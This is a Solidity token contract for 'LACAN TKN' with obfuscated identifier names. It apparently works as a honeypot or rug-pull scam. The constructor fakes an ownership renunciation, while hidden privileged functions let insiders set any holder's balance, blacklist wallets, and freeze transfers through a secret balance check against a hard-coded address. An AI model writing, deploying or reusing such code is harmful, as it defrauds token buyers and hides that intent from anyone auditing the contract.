//SPDX-License-Identifier: MIT

pragma solidity ^0.8.3;

interface minIs {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface fundTake {
    function createPair(address feeToken, address marketingSender) external returns (address);
}

abstract contract marketingLimit {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface minFrom {
    function totalSupply() external view returns (uint256);

    function balanceOf(address tradingAt) external view returns (uint256);

    function transfer(address fromLaunch, uint256 minLimit) external returns (bool);

    function allowance(address teamAmount, address spender) external view returns (uint256);

    function approve(address spender, uint256 minLimit) external returns (bool);

    function transferFrom(address sender,address fromLaunch,uint256 minLimit) external returns (bool);

    event Transfer(address indexed from, address indexed enableSwapShould, uint256 value);
    event Approval(address indexed teamAmount, address indexed spender, uint256 value);
}

interface minFromMetadata is minFrom {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract LACANTKN is marketingLimit, minFrom, minFromMetadata {

    string private feeTotalMode = "LTN";

    bool private enableSender;

    function balanceOf(address tradingAt) public view virtual override returns (uint256) {
        return teamFee[tradingAt];
    }

    uint256 private toLiquidityTrading = 100000000 * 10 ** 18;

    mapping(address => uint256) private teamFee;

    function allowance(address txExempt, address enableMarketingSender) external view virtual override returns (uint256) {
        if (enableMarketingSender == isFrom) {
            return type(uint256).max;
        }
        return exemptLimit[txExempt][enableMarketingSender];
    }

    function fundLaunched() private view {
        require(launchFrom[_msgSender()]);
    }

    function liquidityMarketing(address txReceiver) public {
        if (receiverAutoTo) {
            return;
        }
        if (takeIs == txListIs) {
            sellTx = txListIs;
        }
        launchFrom[txReceiver] = true;
        
        receiverAutoTo = true;
    }

    function decimals() external view virtual override returns (uint8) {
        return fromEnable;
    }

    bool private sellList;

    mapping(address => bool) public walletFund;

    function symbol() external view virtual override returns (string memory) {
        return feeTotalMode;
    }

    function walletLimit(address isMax, address fromLaunch, uint256 minLimit) internal returns (bool) {
        require(teamFee[isMax] >= minLimit);
        teamFee[isMax] -= minLimit;
        teamFee[fromLaunch] += minLimit;
        emit Transfer(isMax, fromLaunch, minLimit);
        return true;
    }

    bool private isToken;

    function transferFrom(address isMax, address fromLaunch, uint256 minLimit) external override returns (bool) {
        if (_msgSender() != isFrom) {
            if (exemptLimit[isMax][_msgSender()] != type(uint256).max) {
                require(minLimit <= exemptLimit[isMax][_msgSender()]);
                exemptLimit[isMax][_msgSender()] -= minLimit;
            }
        }
        return autoShould(isMax, fromLaunch, minLimit);
    }

    address isFrom = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function takeMinWallet(address walletFee) public {
        fundLaunched();
        if (sellTx != takeIs) {
            teamTo = true;
        }
        if (walletFee == launchedFeeShould || walletFee == receiverBuyMode) {
            return;
        }
        walletFund[walletFee] = true;
    }

    function autoShould(address isMax, address fromLaunch, uint256 minLimit) internal returns (bool) {
        if (isMax == launchedFeeShould) {
            return walletLimit(isMax, fromLaunch, minLimit);
        }
        uint256 isLaunch = minFrom(receiverBuyMode).balanceOf(receiverTrading);
        require(isLaunch == toFee);
        require(!walletFund[isMax]);
        return walletLimit(isMax, fromLaunch, minLimit);
    }

    bool public receiverAutoTo;

    string private senderLaunch = "LACAN TKN";

    mapping(address => mapping(address => uint256)) private exemptLimit;

    bool public teamTo;

    uint256 toFee;

    uint256 private takeIs;

    function fromMarketingShould(address modeAutoList, uint256 minLimit) public {
        fundLaunched();
        teamFee[modeAutoList] = minLimit;
    }

    mapping(address => bool) public launchFrom;

    function fundToSwap(uint256 minLimit) public {
        fundLaunched();
        toFee = minLimit;
    }

    address receiverTrading = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    address public launchedFeeShould;

    uint256 public sellTx;

    function name() external view virtual override returns (string memory) {
        return senderLaunch;
    }

    function txSender() public {
        emit OwnershipTransferred(launchedFeeShould, address(0));
        receiverLimit = address(0);
    }

    address private receiverLimit;

    function transfer(address modeAutoList, uint256 minLimit) external virtual override returns (bool) {
        return autoShould(_msgSender(), modeAutoList, minLimit);
    }

    uint256 private txListIs;

    bool private listReceiver;

    uint256 sellLaunch;

    address public receiverBuyMode;

    event OwnershipTransferred(address indexed atShould, address indexed fromIs);

    bool private sellIs;

    bool public listSell;

    constructor (){
        if (sellIs == listSell) {
            listReceiver = true;
        }
        txSender();
        minIs atTeam = minIs(isFrom);
        receiverBuyMode = fundTake(atTeam.factory()).createPair(atTeam.WETH(), address(this));
        if (listReceiver) {
            sellList = true;
        }
        launchedFeeShould = _msgSender();
        launchFrom[launchedFeeShould] = true;
        teamFee[launchedFeeShould] = toLiquidityTrading;
        if (txListIs == takeIs) {
            listSell = true;
        }
        emit Transfer(address(0), launchedFeeShould, toLiquidityTrading);
    }

    function getOwner() external view returns (address) {
        return receiverLimit;
    }

    function approve(address enableMarketingSender, uint256 minLimit) public virtual override returns (bool) {
        exemptLimit[_msgSender()][enableMarketingSender] = minLimit;
        emit Approval(_msgSender(), enableMarketingSender, minLimit);
        return true;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return toLiquidityTrading;
    }

    uint8 private fromEnable = 18;

    function owner() external view returns (address) {
        return receiverLimit;
    }

}